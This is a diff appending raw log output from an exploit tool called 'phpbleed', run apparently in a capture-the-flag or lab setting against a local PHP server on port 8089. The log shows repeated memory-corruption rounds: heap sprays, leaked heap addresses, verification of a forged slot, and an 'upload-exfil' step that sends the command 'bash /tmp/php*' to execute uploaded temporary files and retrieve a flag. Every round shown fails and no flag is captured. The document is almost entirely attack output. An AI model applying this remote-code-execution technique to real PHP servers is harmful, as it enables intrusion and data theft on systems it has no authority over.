@@ -5843,3 +5843,278 @@ uid=33(www-d
 18:48:03Z [R-7 round 8] no capture (S-stale-after-id); next round
 18:48:03Z [#33] [idle] GET /f rawlen=491
 18:48:03Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+18:49:42Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+18:49:42Z [R-6/R-7 round 1] opening fresh worker pin
+18:49:42Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:49:42Z [#1] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:49:42Z [#2] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:49:42Z [R-6] S = 0xed3f88a78d18 (reqs=2)
+18:49:42Z [#3] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:49:42Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:43Z [#5] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:49:43Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:43Z [#6] [idle] GET /f rawlen=491
+18:49:43Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:43Z [R-7 round 1] no capture (worker-died-after-capture-shot); next round
+18:49:43Z [R-6/R-7 round 2] opening fresh worker pin
+18:49:43Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:49:43Z [#7] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:49:43Z [#8] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:49:43Z [R-6] S = 0xed3f88a78d18 (reqs=8)
+18:49:43Z [#9] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:49:43Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:43Z [#11] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:49:43Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:43Z [#12] [idle] GET /f rawlen=491
+18:49:43Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:43Z [R-7 round 2] no capture (worker-died-after-capture-shot); next round
+18:49:43Z [R-6/R-7 round 3] opening fresh worker pin
+18:49:43Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:49:43Z [#13] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:49:43Z [#14] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:49:43Z [R-6] S = 0xed3f88a78d18 (reqs=14)
+18:49:43Z [#15] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:49:43Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:43Z [#17] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:49:43Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:43Z [#18] [idle] GET /f rawlen=491
+18:49:43Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:43Z [R-7 round 3] no capture (worker-died-after-capture-shot); next round
+18:49:43Z [R-6/R-7 round 4] opening fresh worker pin
+18:49:43Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:49:44Z [#19] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:49:44Z [#20] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:49:44Z [R-6] S = 0xed3f88a78d18 (reqs=20)
+18:49:44Z [#21] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:49:44Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:44Z [#23] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:49:44Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:44Z [#24] [idle] GET /f rawlen=491
+18:49:44Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:44Z [R-7 round 4] no capture (worker-died-after-capture-shot); next round
+18:49:44Z [R-6/R-7 round 5] opening fresh worker pin
+18:49:44Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:49:44Z [#25] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:49:44Z [#26] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:49:44Z [R-6] S = 0xed3f88a78d18 (reqs=26)
+18:49:44Z [#27] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:49:44Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:44Z [#29] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:49:44Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:44Z [#30] [idle] GET /f rawlen=491
+18:49:44Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:44Z [R-7 round 5] no capture (worker-died-after-capture-shot); next round
+18:49:44Z [R-6/R-7 round 6] opening fresh worker pin
+18:49:44Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:49:44Z [#31] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:49:44Z [#32] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:49:44Z [R-6] S = 0xed3f88a78d18 (reqs=32)
+18:49:44Z [#33] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:49:44Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:45Z [#35] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:49:45Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:45Z [#36] [idle] GET /f rawlen=491
+18:49:45Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:45Z [R-7 round 6] no capture (worker-died-after-capture-shot); next round
+18:49:45Z [R-6/R-7 round 7] opening fresh worker pin
+18:49:45Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:49:45Z [#37] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:49:45Z [#38] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:49:45Z [R-6] S = 0xed3f88a78d18 (reqs=38)
+18:49:45Z [#39] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:49:45Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:45Z [#41] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:49:45Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:45Z [#42] [idle] GET /f rawlen=491
+18:49:45Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:45Z [R-7 round 7] no capture (worker-died-after-capture-shot); next round
+18:49:45Z [R-6/R-7 round 8] opening fresh worker pin
+18:49:45Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:49:45Z [#43] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:49:45Z [#44] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:49:45Z [R-6] S = 0xed3f88a78d18 (reqs=44)
+18:49:45Z [#45] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:49:45Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:46Z [#47] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:49:46Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:46Z [#48] [idle] GET /f rawlen=491
+18:49:46Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:46Z [R-7 round 8] no capture (worker-died-after-capture-shot); next round
+18:49:46Z [#49] [idle] GET /f rawlen=491
+18:49:46Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+18:51:40Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+18:51:40Z [R-6/R-7 round 1] opening fresh worker pin
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#1] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6 round 1] no slot; refreshing R-1 heap leak
+18:51:40Z [#2] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#3] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6] FAILED round 1 (spray slot not found)
+18:51:40Z [R-6/R-7 round 2] opening fresh worker pin
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#4] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6 round 2] no slot; refreshing R-1 heap leak
+18:51:40Z [#5] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#6] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6] FAILED round 2 (spray slot not found)
+18:51:40Z [R-6/R-7 round 3] opening fresh worker pin
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#7] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6 round 3] no slot; refreshing R-1 heap leak
+18:51:40Z [#8] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#9] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6] FAILED round 3 (spray slot not found)
+18:51:40Z [R-6/R-7 round 4] opening fresh worker pin
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#10] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6 round 4] no slot; refreshing R-1 heap leak
+18:51:40Z [#11] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#12] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6] FAILED round 4 (spray slot not found)
+18:51:40Z [R-6/R-7 round 5] opening fresh worker pin
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#13] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6 round 5] no slot; refreshing R-1 heap leak
+18:51:40Z [#14] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#15] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6] FAILED round 5 (spray slot not found)
+18:51:40Z [R-6/R-7 round 6] opening fresh worker pin
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#16] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6 round 6] no slot; refreshing R-1 heap leak
+18:51:40Z [#17] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#18] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6] FAILED round 6 (spray slot not found)
+18:51:40Z [R-6/R-7 round 7] opening fresh worker pin
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#19] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6 round 7] no slot; refreshing R-1 heap leak
+18:51:40Z [#20] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#21] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6] FAILED round 7 (spray slot not found)
+18:51:40Z [R-6/R-7 round 8] opening fresh worker pin
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#22] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6 round 8] no slot; refreshing R-1 heap leak
+18:51:40Z [#23] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:51:40Z [#24] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=1
+18:51:40Z [R-6] FAILED round 8 (spray slot not found)
+18:51:40Z [#25] [R-6 spray-slot] GET /f rawlen=491
+18:51:40Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+18:52:24Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:52:24Z [#1] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:52:24Z [#2] [init@0xed3f88a00040] pin-ok rawlen=177 bodylen=4 chunked=False n=2
+18:52:57Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:52:57Z [#1] [init@0xed3f88a00040] pin-ok rawlen=402684 bodylen=402465 chunked=True n=1
+18:52:57Z [#2] [init@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:52:57Z [#3] [init@0xed3f88a6e200] pin-ok rawlen=9662 bodylen=9444 chunked=True n=3
+18:52:57Z [#4] [init@0xed3f88a6df80] pin-ok rawlen=9944 bodylen=9726 chunked=True n=4
+18:52:57Z [#5] [init@0xed3f88a6e340] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:52:57Z [#6] [init@0xed3f88a6e480] pin-ok rawlen=271812 bodylen=271593 chunked=True n=6
+18:53:07Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+18:53:07Z [R-6/R-7 round 1] opening fresh worker pin
+18:53:07Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:53:07Z [#1] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=402684 bodylen=402465 chunked=True n=1
+18:53:07Z [#2] [R-6 spray-slot@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:53:07Z [R-6] S = 0xed3f88a6e0d8 (reqs=2)
+18:53:07Z [#3] [R-7 verify-S@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:53:07Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:07Z [#5] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:53:07Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:07Z [#6] [idle] GET /f rawlen=491
+18:53:07Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:07Z [R-7 round 1] no capture (worker-died-after-capture-shot); next round
+18:53:07Z [R-6/R-7 round 2] opening fresh worker pin
+18:53:07Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:53:07Z [#7] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=402684 bodylen=402465 chunked=True n=1
+18:53:07Z [#8] [R-6 spray-slot@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:53:07Z [R-6] S = 0xed3f88a6e0d8 (reqs=8)
+18:53:07Z [#9] [R-7 verify-S@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:53:07Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:07Z [#11] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:53:07Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:07Z [#12] [idle] GET /f rawlen=491
+18:53:07Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:07Z [R-7 round 2] no capture (worker-died-after-capture-shot); next round
+18:53:07Z [R-6/R-7 round 3] opening fresh worker pin
+18:53:07Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:53:07Z [#13] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=402684 bodylen=402465 chunked=True n=1
+18:53:07Z [#14] [R-6 spray-slot@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:53:07Z [R-6] S = 0xed3f88a6e0d8 (reqs=14)
+18:53:07Z [#15] [R-7 verify-S@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:53:07Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:07Z [#17] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:53:07Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:07Z [#18] [idle] GET /f rawlen=491
+18:53:07Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:07Z [R-7 round 3] no capture (worker-died-after-capture-shot); next round
+18:53:07Z [R-6/R-7 round 4] opening fresh worker pin
+18:53:07Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:53:07Z [#19] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=402684 bodylen=402465 chunked=True n=1
+18:53:07Z [#20] [R-6 spray-slot@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:53:07Z [R-6] S = 0xed3f88a6e0d8 (reqs=20)
+18:53:08Z [#21] [R-7 verify-S@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:53:08Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:08Z [#23] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:53:08Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:08Z [#24] [idle] GET /f rawlen=491
+18:53:08Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:08Z [R-7 round 4] no capture (worker-died-after-capture-shot); next round
+18:53:08Z [R-6/R-7 round 5] opening fresh worker pin
+18:53:08Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:53:08Z [#25] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=402684 bodylen=402465 chunked=True n=1
+18:53:08Z [#26] [R-6 spray-slot@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:53:08Z [R-6] S = 0xed3f88a6e0d8 (reqs=26)
+18:53:08Z [#27] [R-7 verify-S@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:53:08Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:08Z [#29] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:53:08Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:08Z [#30] [idle] GET /f rawlen=491
+18:53:08Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:08Z [R-7 round 5] no capture (worker-died-after-capture-shot); next round
+18:53:08Z [R-6/R-7 round 6] opening fresh worker pin
+18:53:08Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:53:08Z [#31] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=402684 bodylen=402465 chunked=True n=1
+18:53:08Z [#32] [R-6 spray-slot@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:53:08Z [R-6] S = 0xed3f88a6e0d8 (reqs=32)
+18:53:08Z [#33] [R-7 verify-S@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:53:08Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:08Z [#35] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:53:08Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:08Z [#36] [idle] GET /f rawlen=491
+18:53:08Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:08Z [R-7 round 6] no capture (worker-died-after-capture-shot); next round
+18:53:08Z [R-6/R-7 round 7] opening fresh worker pin
+18:53:08Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:53:08Z [#37] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=402684 bodylen=402465 chunked=True n=1
+18:53:08Z [#38] [R-6 spray-slot@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:53:08Z [R-6] S = 0xed3f88a6e0d8 (reqs=38)
+18:53:08Z [#39] [R-7 verify-S@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:53:08Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:09Z [#41] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:53:09Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:09Z [#42] [idle] GET /f rawlen=491
+18:53:09Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:09Z [R-7 round 7] no capture (worker-died-after-capture-shot); next round
+18:53:09Z [R-6/R-7 round 8] opening fresh worker pin
+18:53:09Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:53:09Z [#43] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=402684 bodylen=402465 chunked=True n=1
+18:53:09Z [#44] [R-6 spray-slot@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:53:09Z [R-6] S = 0xed3f88a6e0d8 (reqs=44)
+18:53:09Z [#45] [R-7 verify-S@0xed3f88a6e0c0] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:53:09Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:09Z [#47] [R-7 upload-exfil cmd=b'bash /tmp/php*'] PIN-CRASH/conn-closed rawlen=0
+18:53:09Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:09Z [#48] [idle] GET /f rawlen=491
+18:53:09Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:09Z [R-7 round 8] no capture (worker-died-after-capture-shot); next round
+18:53:09Z [#49] [idle] GET /f rawlen=491
+18:53:09Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
